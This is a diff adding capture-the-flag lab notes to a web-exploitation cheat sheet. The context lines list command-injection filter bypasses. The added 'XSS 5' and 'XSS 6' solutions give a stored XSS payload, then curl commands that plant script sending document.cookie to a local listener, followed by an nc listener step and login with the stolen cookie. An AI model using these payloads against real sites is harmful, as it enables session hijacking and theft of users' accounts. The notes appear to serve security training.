@@ -124,3 +124,28 @@ IFS (space alternative)	$IFS	Bypasses space-based filters
 \x00 (null byte)	%00	Can truncate strings in some functions
 \e (escape)	-	Can manipulate terminal behavior
 ```
+
+#### XSS 5
+
+login: `guest:password`
+try basic XSS.
+drafts could be published with a GET request to `/publish`.
+add a stored XSS payload using fetch:
+
+```js
+<script>
+fetch('/publish')
+</script>
+```
+
+XSS 6
+
+payload 
+
+```sh
+curl -c cookies.txt -X POST -d "username=guest&password=password&submit=on" http://challenge.localhost:80/login
+curl -b cookies.txt -X POST -d "content=<script>fetch('http://127.0.0.1:9000',{method:'POST',body:document.cookie})</script>&publish=on" http://challenge.localhost:80/draft
+curl -b cookies.txt http://challenge.localhost:80/
+```
+
+then do nc -lnvp and wait. login using the cookie.
